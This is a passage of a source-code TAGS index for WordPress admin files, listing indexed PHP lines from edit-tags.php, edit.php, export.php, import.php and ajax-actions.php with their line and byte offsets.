	$tag_ID = (int) $_REQUEST['tag_ID'];tag_ID124,3110
	$tag = get_term( $tag_ID, $taxonomy, OBJECT, 'edit' );tag126,3149
	$tag_ID = (int) $_POST['tag_ID'];tag_ID135,3421
	$tag = get_term( $tag_ID, $taxonomy );tag141,3598
	$ret = wp_update_term( $tag_ID, $taxonomy, $_POST );ret145,3755
	$location = 'edit-tags.php?taxonomy=' . $taxonomy;location147,3810
	if ( $referer = wp_get_original_referer() ) {referer151,3935
			$location = $referer;location153,4037
		$location = add_query_arg( 'message', 3, $location );location157,4103
		$location = add_query_arg( 'message', 5, $location );location159,4165
	$location = remove_query_arg( array('_wp_http_referer', '_wpnonce'), stripslashes($_SERVER['REQUEST_URI']) );location167,4321
		$location = add_query_arg( 'paged', (int) $_REQUEST['paged'] );location170,4471
$total_pages = $wp_list_table->get_pagination_arg( 'total_pages' );total_pages177,4608
	$help ='';help189,5009
		$help = '<p>' . sprintf(__( 'You can use categories to define sections of your site and group related posts. The default category is &#8220;Uncategorized&#8221; until you change it in your <a href="%s">writing settings</a>.' ) , 'options-writing.php' ) . '</p>';help191,5053
		$help = '<p>' . __( 'You can create groups of links by using Link Categories. Link Category names must be unique and Link Categories are separate from the categories you use for posts.' ) . '</p>';help193,5359
		$help = '<p>' . __( 'You can assign keywords to your posts using <strong>tags</strong>. Unlike categories, tags have no hierarchy, meaning there&#8217;s no relationship from one tag to another.' ) . '</p>';help195,5565
			$help = '<p>' . __( 'When adding a new category on this screen, you&#8217;ll fill in the following fields:' ) . '</p>';help210,6676
			$help = '<p>' . __( 'When adding a new tag on this screen, you&#8217;ll fill in the following fields:' ) . '</p>';help212,6806
	$help = '<p><strong>' . __( 'For more information:' ) . '</strong></p>';help234,8178
<?php if ( isset($_REQUEST['message']) && ( $msg = (int) $_REQUEST['message'] ) ) : ?>msg271,9581
		$tag_cloud = wp_tag_cloud( array( 'taxonomy' => $taxonomy, 'echo' => false, 'link' => 'edit' ) );tag_cloud324,11661
		$tag_cloud = wp_tag_cloud( array( 'taxonomy' => $taxonomy, 'echo' => false ) );tag_cloud326,11767

wordpress/wp-admin/edit.php,2945
$post_type = $typenow;post_type15,238
$post_type_object = get_post_type_object( $post_type );post_type_object16,261
$wp_list_table = _get_list_table('WP_Posts_List_Table');wp_list_table24,488
$pagenum = $wp_list_table->get_pagenum();pagenum25,545
	$parent_file = "edit.php?post_type=$post_type";parent_file37,905
	$submenu_file = "edit.php?post_type=$post_type";submenu_file38,954
	$post_new_file = "post-new.php?post_type=$post_type";post_new_file39,1004
	$parent_file = 'edit.php';parent_file41,1068
	$submenu_file = 'edit.php';submenu_file42,1096
	$post_new_file = 'post-new.php';post_new_file43,1125
$doaction = $wp_list_table->current_action();doaction46,1162
	$sendback = remove_query_arg( array('trashed', 'untrashed', 'deleted', 'ids'), wp_get_referer() );sendback51,1265
		$sendback = admin_url( $parent_file );sendback53,1385
	$sendback = add_query_arg( 'paged', $pagenum, $sendback );sendback54,1426
		$sendback = admin_url($post_new_file);sendback56,1534
		$post_status = preg_replace('/[^a-z0-9_-]+/i', '', $_REQUEST['post_status']);post_status59,1612
			$post_ids = $wpdb->get_col( $wpdb->prepare( "SELECT ID FROM $wpdb->posts WHERE post_type=%s AND post_status = %s", $post_type, $post_status ) );post_ids61,1776
		$doaction = 'delete';doaction62,1924
		$post_ids = $_REQUEST['media'];post_ids64,1992
		$post_ids = explode( ',', $_REQUEST['ids'] );post_ids66,2068
		$post_ids = array_map('intval', $_REQUEST['post']);post_ids68,2160
			$trashed = 0;trashed78,2328
			$sendback = add_query_arg( array('trashed' => $trashed, 'ids' => join(',', $post_ids) ), $sendback );sendback88,2648
			$untrashed = 0;untrashed91,2781
			$sendback = add_query_arg('untrashed', $untrashed, $sendback);sendback101,3117
			$deleted = 0;deleted104,3210
				$post_del = & get_post($post_id);post_del106,3273
			$sendback = add_query_arg('deleted', $deleted, $sendback);sendback120,3713
				$done = bulk_edit_posts($_REQUEST);done124,3842
					$sendback = add_query_arg( $done, $sendback );sendback130,4063
	$sendback = remove_query_arg( array('action', 'action2', 'tags_input', 'post_author', 'comment_status', 'ping_status', '_status', 'post', 'bulk_edit', 'post_view'), $sendback );sendback136,4140
$title = $post_type_object->labels->name;title149,4608
	$messages = array();messages230,10164
<?php if ( isset( $_REQUEST['updated'] ) && $updated = absint( $_REQUEST['updated'] ) ) {updated233,10227
if ( isset( $_REQUEST['locked'] ) && $locked = absint( $_REQUEST['locked'] ) ) {locked237,10435
if ( isset( $_REQUEST['deleted'] ) && $deleted = absint( $_REQUEST['deleted'] ) ) {deleted241,10690
if ( isset( $_REQUEST['trashed'] ) && $trashed = absint( $_REQUEST['trashed'] ) ) {trashed245,10913
	$ids = isset($_REQUEST['ids']) ? $_REQUEST['ids'] : 0;ids247,11131
if ( isset( $_REQUEST['untrashed'] ) && $untrashed = absint( $_REQUEST['untrashed'] ) ) {untrashed251,11360

wordpress/wp-admin/export.php,961
$title = __('Export');title17,372
function add_js() {add_js19,396
	$args = array();args55,2003
function export_date_options( $post_type = 'post' ) {export_date_options98,3090
function export_date_options( $post_type = 'post' ) {post_type98,3090
	$months = $wpdb->get_results( $wpdb->prepare( "months101,3172
	$month_count = count( $months );month_count108,3416
		$month = zeroise( $date->month, 2 );month116,3606
<p><?php _e('Once you&#8217;ve saved the download file, you can use the Import function in another WordPress installation to import the content from this site.'); ?></p>in128,4154
		$authors = $wpdb->get_col( "SELECT DISTINCT post_author FROM {$wpdb->posts} WHERE post_type = 'post'" );authors145,5092
			<?php $post_stati = get_post_stati( array( 'internal' => false ), 'objects' );post_stati164,5805
		$authors = $wpdb->get_col( "SELECT DISTINCT post_author FROM {$wpdb->posts} WHERE post_type = 'page'" );authors177,6291

wordpress/wp-admin/freedoms.php,323
$title = __( 'Freedoms' );title12,181
$plugins_url = current_user_can( 'activate_plugins' ) ? admin_url( 'plugins.php' ) : 'http://wordpress.org/extend/plugins/';plugins_url49,2402
$themes_url = current_user_can( 'switch_themes' ) ? admin_url( 'themes.php' ) : 'http://wordpress.org/extend/themes/';themes_url50,2527

wordpress/wp-admin/gears-manifest.php,242
define( 'ABSPATH', dirname(dirname(__FILE__)) . '/' );ABSPATH17,324
$files = get_manifest();files21,435
$entries = '';entries34,837
	$ignore_query = ( isset($file[2]) && !$file[2] ) ? '' : ', "ignoreQuery" : true ';ignore_query38,923

wordpress/wp-admin/import.php,1430
define('WP_LOAD_IMPORTERS', true);WP_LOAD_IMPORTERS9,112
$title = __('Import');title17,332
$popular_importers = array();popular_importers32,1365
	$popular_importers = array(popular_importers34,1438
$parent_file = 'tools.php';parent_file54,2988
$importers = get_importers();importers67,3537
foreach ( $popular_importers as $pop_importer => $pop_data ) {pop_importer70,3676
	$style = '';style87,4200
	foreach ($importers as $id => $data) {id88,4214
		$style = ('class="alternate"' == $style || 'class="alternate active"' == $style) ? '' : 'alternate';style89,4254
		$action = '';action90,4357
			$plugin_slug = $id . '-importer';plugin_slug92,4406
				$plugins = get_plugins( '/' . $plugin_slug );plugins95,4561
					$keys = array_keys($plugins);keys97,4641
					$plugin_file = $plugin_slug . '/' . $keys[0];plugin_file98,4676
					$action = '<a href="' . esc_url(wp_nonce_url(admin_url('plugins.php?action=activate&plugin=' . $plugin_file . '&from=import'), 'activate-plugin_' . $plugin_file)) .action99,4727
					$action = '<a href="' . esc_url( network_admin_url( 'plugin-install.php?tab=plugin-information&plugin=' . $plugin_slug .action105,5048
					$action = $data[0];action109,5354
			$action = "<a href='" . esc_url("admin.php?import=$id") . "' title='" . esc_attr( wptexturize(strip_tags($data[1])) ) ."'>{$data[0]}</a>";action114,5586
			$style = 'class="'.$style.'"';style118,5753

wordpress/wp-admin/includes/admin.php,0

wordpress/wp-admin/includes/ajax-actions.php,28208
function wp_ajax_nopriv_autosave() {wp_ajax_nopriv_autosave13,142
	$id = isset( $_POST['post_ID'] ) ? (int) $_POST['post_ID'] : 0;id14,179
	$message = sprintf( __('<strong>ALERT: You are logged out!</strong> Could not save draft. <a href="%s" target="_blank">Please log in again.</a>'), wp_login_url() );message19,276
	$x = new WP_Ajax_Response( array(x20,442
function wp_ajax_fetch_list() {wp_ajax_fetch_list31,594
	$list_class = $_GET['list_args']['class'];list_class34,668
	$current_screen = convert_to_screen( $_GET['list_args']['screen']['id'] );current_screen37,788
	define( 'WP_NETWORK_ADMIN', $current_screen->is_network );WP_NETWORK_ADMIN39,865
	define( 'WP_USER_ADMIN', $current_screen->is_user );WP_USER_ADMIN40,925
	$wp_list_table = _get_list_table( $list_class );wp_list_table42,980
function wp_ajax_ajax_tag_search() {wp_ajax_ajax_tag_search53,1181
		$taxonomy = sanitize_key( $_GET['tax'] );taxonomy57,1266
		$tax = get_taxonomy( $taxonomy );tax58,1310
	$s = stripslashes( $_GET['q'] );s67,1479
	$comma = _x( ',', 'tag delimiter' );comma69,1514
		$s = str_replace( $comma, ',', $s );s71,1575
		$s = explode( ',', $s );s73,1652
		$s = $s[count( $s ) - 1];s74,1679
	$s = trim( $s );s76,1710
	$results = $wpdb->get_col( $wpdb->prepare( "SELECT t.name FROM $wpdb->term_taxonomy AS tt INNER JOIN $wpdb->terms AS t ON tt.term_id = t.term_id WHERE tt.taxonomy = %s AND t.name LIKE (%s)", $taxonomy, '%' . like_escape( $s ) . '%' ) );results80,1798
function wp_ajax_wp_compression_test() {wp_ajax_wp_compression_test86,2081
		$force_gzip = ( defined('ENFORCE_GZIP') && ENFORCE_GZIP );force_gzip101,2665
		$test_str = '"wpCompressionTest Lorem ipsum dolor sit amet consectetuer mollis sapien urna ut a. Eu nonummy condimentum fringilla tempor pretium platea vel nibh netus Maecenas. Hac molestie amet justo quis pellentesque est ultrices interdum nibh Morbi. Cras mattis pretium Phasellus ante ipsum ipsum ut sociis Suspendisse Lorem. Ante et non molestie. Porta urna Vestibulum egestas id congue nibh eu risus gravida sit. Ac augue auctor Ut et non a elit massa id sodales. Elit eu Nulla at nibh adipiscing mattis lacus mauris at tempus. Netus nibh quis suscipit nec feugiat eget sed lorem et urna. Pellentesque lacus at ut massa consectetuer ligula ut auctor semper Pellentesque. Ut metus massa nibh quam Curabitur molestie nec mauris congue. Volutpat molestie elit justo facilisis neque ac risus Ut nascetur tristique. Vitae sit lorem tellus et quis Phasellus lacus tincidunt nunc Fusce. Pharetra wisi Suspendisse mus sagittis libero lacinia Integer consequat ac Phasellus. Et urna ac cursus tortor aliquam Aliquam amet tellus volutpat Vestibulum. Justo interdum condimentum In augue congue tellus sollicitudin Quisque quis nibh."';test_str102,2726
				$out = gzdeflate( $test_str, 1 );out112,4196
				$out = gzencode( $test_str, 1 );out115,4382
function wp_ajax_imgedit_preview() {wp_ajax_imgedit_preview131,4685
	$post_id = intval($_GET['postid']);post_id132,4722
function wp_ajax_oembed_cache() {wp_ajax_oembed_cache145,5028
	$return = ( $wp_embed->cache_oembed( $_GET['post'] ) ) ? '1' : '0';return148,5082
function wp_ajax_autocomplete_user() {wp_ajax_autocomplete_user152,5174
	$return = array();return159,5440
		$type = $_REQUEST['autocomplete_type'];type163,5539
		$type = 'add';type165,5587
		$id = absint( $_REQUEST['site_id'] );id169,5682
		$id = get_current_blog_id();id171,5728
	$include_blog_users = ( $type == 'search' ? get_users( array( 'blog_id' => $id, 'fields' => 'ID' ) ) : array() );include_blog_users173,5760
	$exclude_blog_users = ( $type == 'add' ? get_users( array( 'blog_id' => $id, 'fields' => 'ID' ) ) : array() );exclude_blog_users174,5875
	$users = get_users( array(users176,5988
function wp_ajax_dashboard_widgets() {wp_ajax_dashboard_widgets195,6506
function wp_ajax_logged_in() {wp_ajax_logged_in215,6929
function _wp_ajax_delete_comment_response( $comment_id, $delta = -1 ) {_wp_ajax_delete_comment_response233,7235
function _wp_ajax_delete_comment_response( $comment_id, $delta = -1 ) {delta233,7235
	$total = (int) @$_POST['_total'];total234,7307
	$per_page = (int) @$_POST['_per_page'];per_page235,7342
	$page = (int) @$_POST['_page'];page236,7383
	$url = esc_url_raw( @$_POST['_url'] );url237,7416
		$total = 0;total244,7644
		$post_id = 0;post_id248,7806
		$status = 'total_comments'; // What type of comment count are we looking for?status249,7822
		$parsed = parse_url( $url );parsed250,7902
				$status = $query_vars['comment_status'];status254,8067
				$post_id = (int) $query_vars['p'];post_id256,8149
		$comment_count = wp_count_comments($post_id);comment_count259,8193
			$total = $comment_count->$status;total262,8335
	$time = time(); // The time since the last comment counttime266,8424
	$x = new WP_Ajax_Response( array(x268,8483
function _wp_ajax_add_hierarchical_term() {_wp_ajax_add_hierarchical_term286,8956
	$action = $_POST['action'];action287,9000
	$taxonomy = get_taxonomy(substr($action, 4));taxonomy288,9029
	$names = explode(',', $_POST['new'.$taxonomy->name]);names292,9218
	$parent = isset($_POST['new'.$taxonomy->name.'_parent']) ? (int) $_POST['new'.$taxonomy->name.'_parent'] : 0;parent293,9273
		$parent = 0;parent295,9404
		$post_category = isset($_POST['post_category']) ? (array) $_POST['post_category'] : array();post_category297,9457
		$post_category = ( isset($_POST['tax_input']) && isset($_POST['tax_input'][$taxonomy->name]) ) ? (array) $_POST['tax_input'][$taxonomy->name] : array();post_category299,9558
	$checked_categories = array_map( 'absint', (array) $post_category );checked_categories300,9713
	$popular_ids = wp_popular_terms_checklist($taxonomy->name, 0, 10, false);popular_ids301,9783
		$cat_name = trim($cat_name);cat_name304,9894
		$category_nicename = sanitize_title($cat_name);category_nicename305,9925
			$cat_id = wp_insert_term( $cat_name, $taxonomy->name, array( 'parent' => $parent ) );cat_id309,10094
			$cat_id = $cat_id['term_id'];cat_id313,10262
		$data = ob_get_contents();data319,10584
		$add = array(add321,10631
		$parent = get_term( $parent, $taxonomy->name );parent330,10852
		$term_id = $parent->term_id;term_id331,10902
			$parent = &get_term( $parent->parent, $taxonomy->name );parent334,10986
			$term_id = $parent->term_id;term_id337,11090
		$data = ob_get_contents();data342,11314
		$add = array(add344,11361
	$sup = ob_get_contents();sup357,11783
	$x = new WP_Ajax_Response( $add );x361,11886
function wp_ajax_delete_comment() {wp_ajax_delete_comment365,11938
	$id = isset( $_POST['id'] ) ? (int) $_POST['id'] : 0;id366,11974
	$status = wp_get_comment_status( $comment->comment_ID );status374,12218
	$delta = -1;delta376,12277
		$r = wp_trash_comment( $comment->comment_ID );r380,12397
		$r = wp_untrash_comment( $comment->comment_ID );r384,12562
			$delta = 1;delta386,12725
		$r = wp_spam_comment( $comment->comment_ID );r390,12849
		$r = wp_unspam_comment( $comment->comment_ID );r394,13010
			$delta = 1;delta396,13169
		$r = wp_delete_comment( $comment->comment_ID );r398,13249
function wp_ajax_delete_tag() {wp_ajax_delete_tag408,13534
	$tag_id = (int) $_POST['tag_ID'];tag_id409,13566
	$taxonomy = !empty($_POST['taxonomy']) ? $_POST['taxonomy'] : 'post_tag';taxonomy412,13647
	$tax = get_taxonomy($taxonomy);tax413,13722
	$tag = get_term( $tag_id, $taxonomy );tag418,13826
function wp_ajax_delete_link() {wp_ajax_delete_link428,14000
	$id = isset( $_POST['id'] ) ? (int) $_POST['id'] : 0;id429,14033
	$link = get_bookmark( $id );link435,14196
function wp_ajax_delete_meta() {wp_ajax_delete_meta445,14350
	$id = isset( $_POST['id'] ) ? (int) $_POST['id'] : 0;id446,14383
function wp_ajax_delete_post( $action ) {wp_ajax_delete_post459,14766
		$action = 'delete-post';action461,14833
	$id = isset( $_POST['id'] ) ? (int) $_POST['id'] : 0;id462,14860
function wp_ajax_trash_post( $action ) {wp_ajax_trash_post477,15131
		$action = 'trash-post';action479,15197
	$id = isset( $_POST['id'] ) ? (int) $_POST['id'] : 0;id480,15223
		$done = wp_trash_post( $id );done490,15457
		$done = wp_untrash_post( $id );done492,15495
function wp_ajax_untrash_post( $action ) {wp_ajax_untrash_post500,15577
		$action = 'untrash-post';action502,15645
function wp_ajax_delete_page( $action ) {wp_ajax_delete_page506,15708
		$action = 'delete-page';action508,15775
	$id = isset( $_POST['id'] ) ? (int) $_POST['id'] : 0;id509,15802
function wp_ajax_dim_comment() {wp_ajax_dim_comment524,16073
	$id = isset( $_POST['id'] ) ? (int) $_POST['id'] : 0;id525,16106
		$x = new WP_Ajax_Response( array(x528,16203
	$current = wp_get_comment_status( $comment->comment_ID );current538,16507
		$result = wp_set_comment_status( $comment->comment_ID, 'approve', true );result544,16727
		$result = wp_set_comment_status( $comment->comment_ID, 'hold', true );result546,16809
		$x = new WP_Ajax_Response( array(x549,16914
function wp_ajax_add_link_category( $action ) {wp_ajax_add_link_category561,17204
		$action = 'add-link-category';action563,17277
	$names = explode(',', $_POST['newcat']);names567,17407
	$x = new WP_Ajax_Response();x568,17449
		$cat_name = trim($cat_name);cat_name570,17514
		$slug = sanitize_title($cat_name);slug571,17545
			$cat_id = wp_insert_term( $cat_name, 'link_category' );cat_id575,17679
			$cat_id = $cat_id['term_id'];cat_id579,17817
		$cat_name = esc_html(stripslashes($cat_name));cat_name580,17850
function wp_ajax_add_tag() {wp_ajax_add_tag591,18268
	$post_type = !empty($_POST['post_type']) ? $_POST['post_type'] : 'post';post_type595,18376
	$taxonomy = !empty($_POST['taxonomy']) ? $_POST['taxonomy'] : 'post_tag';taxonomy596,18450
	$tax = get_taxonomy($taxonomy);tax597,18525
	$x = new WP_Ajax_Response();x602,18627
	$tag = wp_insert_term($_POST['tag-name'], $taxonomy, $_POST );tag604,18658
		$message = __('An error has occurred. Please reload the page and try again.');message607,18812
			$message = $tag->get_error_message();message609,18949
	$wp_list_table = _get_list_table('WP_Terms_List_Table');wp_list_table620,19147
	$level = 0;level622,19206
		$level = count( get_ancestors( $tag->term_id, $taxonomy ) );level624,19265
		$noparents = ob_get_clean();noparents627,19388
	$parents = ob_get_clean();parents632,19473
function wp_ajax_get_tagcloud() {wp_ajax_get_tagcloud646,19719
		$taxonomy = sanitize_key( $_POST['tax'] );taxonomy648,19786
		$tax = get_taxonomy( $taxonomy );tax649,19831
	$tags = get_terms( $taxonomy, array( 'number' => 45, 'orderby' => 'count', 'order' => 'DESC' ) );tags658,20000
	foreach ( $tags as $key => $tag ) {key666,20277
	$return = wp_generate_tag_cloud( $tags, array('filter' => 0) );return672,20443
function wp_ajax_get_comments( $action ) {wp_ajax_get_comments682,20578
		$action = 'get-comments';action685,20680
	$wp_list_table = _get_list_table('WP_Post_Comments_List_Table');wp_list_table691,20783
	$x = new WP_Ajax_Response();x701,21006
	$comment_list_item = ob_get_contents();comment_list_item709,21251
function wp_ajax_replyto_comment( $action ) {wp_ajax_replyto_comment719,21404
		$action = 'replyto-comment';action722,21506
	$comment_post_ID = (int) $_POST['comment_post_ID'];comment_post_ID728,21643
	$status = $wpdb->get_var( $wpdb->prepare("SELECT post_status FROM $wpdb->posts WHERE ID = %d", $comment_post_ID) );status732,21772
	$user = wp_get_current_user();user739,22069
		$user_ID = $user->ID;user_ID741,22127
		$comment_author       = $wpdb->escape($user->display_name);comment_author742,22151
		$comment_author_email = $wpdb->escape($user->user_email);comment_author_email743,22213
		$comment_author_url   = $wpdb->escape($user->user_url);comment_author_url744,22273
		$comment_content      = trim($_POST['content']);comment_content745,22331
	$comment_parent = absint($_POST['comment_ID']);comment_parent759,22810
	$comment_auto_approved = false;comment_auto_approved760,22859
	$commentdata = compact('comment_post_ID', 'comment_author', 'comment_author_email', 'comment_author_url', 'comment_content', 'comment_type', 'comment_parent', 'user_ID');commentdata761,22892
	$comment_id = wp_new_comment( $commentdata );comment_id763,23065
	$comment = get_comment($comment_id);comment764,23112
	$position = ( isset($_POST['position']) && (int) $_POST['position'] ) ? (int) $_POST['position'] : '-1';position767,23183
		$parent = get_comment( $comment_parent );parent771,23374
				$comment_auto_approved = true;comment_auto_approved775,23589
				$wp_list_table = _get_list_table('WP_Post_Comments_List_Table');wp_list_table785,23856
				$wp_list_table = _get_list_table('WP_Comments_List_Table');wp_list_table787,23937
		$comment_list_item = ob_get_contents();comment_list_item791,24053
	$response =  array(response794,24113
	$x = new WP_Ajax_Response();x804,24365
function wp_ajax_edit_comment() {wp_ajax_edit_comment809,24434
	$comment_id = (int) $_POST['comment_ID'];comment_id816,24608
	$position = ( isset($_POST['position']) && (int) $_POST['position']) ? (int) $_POST['position'] : '-1';position826,24874
	$comments_status = isset($_POST['comments_listing']) ? $_POST['comments_listing'] : '';comments_status827,24979
	$checkbox = ( isset($_POST['checkbox']) && true == $_POST['checkbox'] ) ? 1 : 0;checkbox829,25069
	$wp_list_table = _get_list_table( $checkbox ? 'WP_Comments_List_Table' : 'WP_Post_Comments_List_Table' );wp_list_table830,25151
	$comment = get_comment( $comment_id );comment832,25259
		$comment_list_item = ob_get_contents();comment_list_item836,25355
	$x = new WP_Ajax_Response();x839,25415
function wp_ajax_add_menu_item() {wp_ajax_add_menu_item851,25603
	$menu_items_data = array();menu_items_data862,25996
					$_object = get_post( $menu_item_data['menu-item-object-id'] );_object871,26328
					$_object = get_term( $menu_item_data['menu-item-object-id'], $menu_item_data['menu-item-object'] );_object875,26430
			$_menu_items = array_map( 'wp_setup_nav_menu_item', array( $_object ) );_menu_items879,26552
			$_menu_item = array_shift( $_menu_items );_menu_item880,26628
	$item_ids = wp_save_nav_menu_items( 0, $menu_items_data );item_ids889,26843
	$menu_items = array();menu_items893,26952
		$menu_obj = get_post( $menu_item_id );menu_obj896,27027
			$menu_obj = wp_setup_nav_menu_item( $menu_obj );menu_obj898,27104
	$walker_class_name = apply_filters( 'wp_edit_nav_menu_walker', 'Walker_Nav_Menu_Edit', $_POST['menu'] );walker_class_name904,27280
		$args = array(args910,27481
function wp_ajax_add_meta() {wp_ajax_add_meta921,27693
	$c = 0;c923,27782
	$pid = (int) $_POST['post_id'];pid924,27791
	$post = get_post( $pid );post925,27824
			$save_POST = $_POST; // Backup $_POSTsave_POST933,28165
			$_POST = array(); // Make it empty for edit_post()_POST934,28206
			$now = current_time('timestamp', 1);now939,28414
			if ( $pid = edit_post() ) {pid942,28597
					$x = new WP_Ajax_Response( array(x944,28661
				$_POST = $save_POST; // Now we can restore original $_POST again_POST950,28778
		$meta = get_metadata_by_mid( 'post', $mid );meta960,29085
		$pid = (int) $meta->post_id;pid961,29132
		$meta = get_object_vars( $meta );meta962,29163
		$x = new WP_Ajax_Response( array(x963,29199
		$mid = (int) key( $_POST['meta'] );mid971,29408
		$key = stripslashes( $_POST['meta'][$mid]['key'] );key972,29446
		$value = stripslashes( $_POST['meta'][$mid]['value'] );value973,29500
		if ( ! $meta = get_metadata_by_mid( 'post', $mid ) )meta978,29729
		$x = new WP_Ajax_Response( array(x989,30343
function wp_ajax_add_user( $action ) {wp_ajax_add_user1004,30658
		$action = 'add-user';action1007,30746
	if ( ! $user_id = edit_user() ) {user_id1012,30862
		$x = new WP_Ajax_Response( array(x1015,30952
	$user_object = new WP_User( $user_id );user_object1021,31053
	$wp_list_table = _get_list_table('WP_Users_List_Table');wp_list_table1023,31095
	$x = new WP_Ajax_Response( array(x1025,31154
function wp_ajax_autosave() {wp_ajax_autosave1037,31513
	define( 'DOING_AUTOSAVE', true );DOING_AUTOSAVE1040,31573
	$nonce_age = check_ajax_referer( 'autosave', 'autosavenonce' );nonce_age1042,31609
	$do_autosave = (bool) $_POST['autosave'];do_autosave1048,31843
	$do_lock = true;do_lock1049,31886
	$data = $alert = '';data1051,31905
	$draft_saved_date_format = __('g:i:s a');draft_saved_date_format1053,31996
	$message = sprintf( __('Draft saved at %s.'), date_i18n( $draft_saved_date_format ) );message1055,32077
	$supplemental = array();supplemental1057,32166
	$id = $revision_id = 0;id1061,32420
	$post_ID = (int) $_POST['post_ID'];post_ID1063,32446
	$post = get_post($post_ID);post1065,32509
	if ( $last = wp_check_post_lock( $post->ID ) ) {last1069,32617
		$do_autosave = $do_lock = false;do_autosave1070,32667
		$last_user = get_userdata( $last );last_user1072,32703
		$last_user_name = $last_user ? $last_user->display_name : __( 'Someone' );last_user_name1073,32741
		$data = __( 'Autosave disabled.' );data1074,32818
			$id = edit_post();id1091,33495
			$revision_id = wp_create_post_autosave( $post->ID );revision_id1093,33614
				$id = $revision_id;id1095,33706
				$id = $post->ID;id1097,33738
		$data = $message;data1099,33763
			$id = 0; // This tells us it didn't actually saveid1102,33834
			$id = $post->ID;id1104,33894
		$lock_result = wp_set_post_lock( $id );lock_result1108,33998
	if ( $nonce_age == 2 ) {nonce_age1112,34112
	$x = new WP_Ajax_Response( array(x1129,34875
function wp_ajax_closed_postboxes() {wp_ajax_closed_postboxes1138,35035
	$closed = isset( $_POST['closed'] ) ? explode( ',', $_POST['closed']) : array();closed1140,35139
	$closed = array_filter($closed);closed1141,35221
	$hidden = isset( $_POST['hidden'] ) ? explode( ',', $_POST['hidden']) : array();hidden1143,35256
	$hidden = array_filter($hidden);hidden1144,35338
	$page = isset( $_POST['page'] ) ? $_POST['page'] : '';page1146,35373
	if ( ! $user = wp_get_current_user() )user1151,35485
		$hidden = array_diff( $hidden, array('submitdiv', 'linksubmitdiv', 'manage-menu', 'create-menu') ); // postboxes that are always shownhidden1158,35670
function wp_ajax_hidden_columns() {wp_ajax_hidden_columns1165,35899
	$hidden = isset( $_POST['hidden'] ) ? $_POST['hidden'] : '';hidden1167,36003
	$hidden = explode( ',', $_POST['hidden'] );hidden1168,36065
	$page = isset( $_POST['page'] ) ? $_POST['page'] : '';page1169,36110
	if ( ! $user = wp_get_current_user() )user1174,36222
function wp_ajax_update_welcome_panel() {wp_ajax_update_welcome_panel1183,36401
function wp_ajax_menu_get_metabox() {wp_ajax_menu_get_metabox1194,36699
		$type = 'posttype';type1201,36941
		$callback = 'wp_nav_menu_item_post_type_meta_box';callback1202,36963
		$items = (array) get_post_types( array( 'show_in_nav_menus' => true ), 'object' );items1203,37016
		$type = 'taxonomy';type1205,37183
		$callback = 'wp_nav_menu_item_taxonomy_meta_box';callback1206,37205
		$items = (array) get_taxonomies( array( 'show_ui' => true ), 'object' );items1207,37257
		$item = apply_filters( 'nav_menu_meta_box_object', $items[ $_POST['item-object'] ] );item1211,37421
		$markup = ob_get_clean();markup1223,37715
function wp_ajax_wp_link_ajax() {wp_ajax_wp_link_ajax1234,37864
	$args = array();args1237,37965
	$results = _WP_Editors::wp_link_query( $args );results1244,38198
function wp_ajax_menu_locations_save() {wp_ajax_menu_locations_save1255,38350
function wp_ajax_meta_box_order() {wp_ajax_meta_box_order1265,38693
	$order = isset( $_POST['order'] ) ? (array) $_POST['order'] : false;order1267,38770
	$page_columns = isset( $_POST['page_columns'] ) ? $_POST['page_columns'] : 'auto';page_columns1268,38840
		$page_columns = (int) $page_columns;page_columns1271,38957
	$page = isset( $_POST['page'] ) ? $_POST['page'] : '';page1273,38997
	if ( ! $user = wp_get_current_user() )user1278,39109
function wp_ajax_menu_quick_search() {wp_ajax_menu_quick_search1290,39370
function wp_ajax_get_permalink() {wp_ajax_get_permalink1301,39590
	$post_id = isset($_POST['post_id'])? intval($_POST['post_id']) : 0;post_id1303,39685
function wp_ajax_sample_permalink() {wp_ajax_sample_permalink1307,39842
	$post_id = isset($_POST['post_id'])? intval($_POST['post_id']) : 0;post_id1309,39946
	$title = isset($_POST['new_title'])? $_POST['new_title'] : '';title1310,40015
	$slug = isset($_POST['new_slug'])? $_POST['new_slug'] : null;slug1311,40079
function wp_ajax_inline_save() {wp_ajax_inline_save1315,40210
	if ( ! isset($_POST['post_ID']) || ! ( $post_ID = (int) $_POST['post_ID'] ) )post_ID1320,40327
	if ( $last = wp_check_post_lock( $post_ID ) ) {last1333,40743
		$last_user = get_userdata( $last );last_user1334,40792
		$last_user_name = $last_user ? $last_user->display_name : __( 'Someone' );last_user_name1335,40830
	$data = &$_POST;data1340,41125
	$post = get_post( $post_ID, ARRAY_A );post1342,41144
	$post = add_magic_quotes($post); //since it is from dbpost1343,41184
	$wp_list_table = _get_list_table('WP_Posts_List_Table');wp_list_table1368,41819
	$mode = $_POST['post_view'];mode1370,41878
function wp_ajax_inline_save_tax() {wp_ajax_inline_save_tax1376,41996
	$taxonomy = sanitize_key( $_POST['taxonomy'] );taxonomy1381,42120
	$tax = get_taxonomy( $taxonomy );tax1382,42169
	$wp_list_table = _get_list_table('WP_Terms_List_Table');wp_list_table1391,42349
	if ( ! isset($_POST['tax_ID']) || ! ( $id = (int) $_POST['tax_ID'] ) )id1393,42408
	$tag = get_term( $id, $taxonomy );tag1396,42497
	$updated = wp_update_term($id, $taxonomy, $_POST);updated1399,42578
		$tag = get_term( $updated['term_id'], $taxonomy );tag1401,42675
function wp_ajax_find_posts() {wp_ajax_find_posts1418,43129
		$what = $_POST['post_type'];what1427,43345
		$what = 'post';what1429,43382
	$s = stripslashes($_POST['ps']);s1431,43401
	$search_terms = array_map('_search_terms_tidy', $matches[0]);search_terms1433,43509
	$searchand = $search = '';searchand1435,43573
		$term = esc_sql( like_escape( $term ) );term1437,43647
		$searchand = ' AND ';searchand1439,43811
	$term = esc_sql( like_escape( $s ) );term1441,43838
	$posts = $wpdb->get_results( "SELECT ID, post_title, post_status, post_date FROM $wpdb->posts WHERE post_type = '$what' AND post_status IN ('draft', 'publish') AND ($search) ORDER BY post_date_gmt DESC LIMIT 50" );posts1445,44048
		$posttype = get_post_type_object($what);posttype1448,44284
	$html = '<table class="widefat" cellspacing="0"><thead><tr><th class="found-radio"><br /></th><th>'.__('Title').'</th><th>'.__('Date').'</th><th>'.__('Status').'</th></tr></thead><tbody>';html1452,44373
				$stat = __('Published');stat1458,44669
				$stat = __('Scheduled');stat1461,44728
				$stat = __('Pending Review');stat1464,44788
				$stat = __('Draft');stat1467,44851
			$time = '';time1472,44945
			$time = mysql2date(__('Y/m/d'), $post->post_date);time1475,45047
	$x = new WP_Ajax_Response();x1483,45480
function wp_ajax_widgets_order() {wp_ajax_widgets_order1492,45586
		$sidebars = array();sidebars1502,45880
